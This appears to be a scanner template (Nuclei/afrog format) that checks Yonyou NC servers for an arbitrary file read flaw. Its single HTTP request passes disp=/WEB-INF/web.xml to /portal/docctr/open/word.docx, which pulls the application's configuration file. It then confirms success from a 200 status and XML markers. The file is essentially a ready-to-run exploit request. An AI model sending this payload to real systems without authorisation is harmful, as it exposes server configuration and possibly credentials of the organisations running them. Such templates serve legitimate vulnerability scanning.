id: yonyou-nc-word-docx-fileread

info:
  name: 用友NC word.docx存在任意文件读取漏洞
  author: qwtd
  severity: high
  reference:
    - https://github.com/zan8in/afrog/blob/581ffcf8a1cc66b8c218783d559e240e4f5aa865/pocs/afrog-pocs/vulnerability/yonyou-nc-word-docx-fileread.yaml#L24
  tags: 用友-U8,用友-NC-Cloud,Yonyou-UFIDA-NC,Yonyou-U8-Cloud

http:
  - raw:
      - |
        GET /portal/docctr/open/word.docx?disp=/WEB-INF/web.xml HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "<?xml"
          - "encoding"
          - "NC Portal"
        condition: and

      - type: status
        status:
          - 200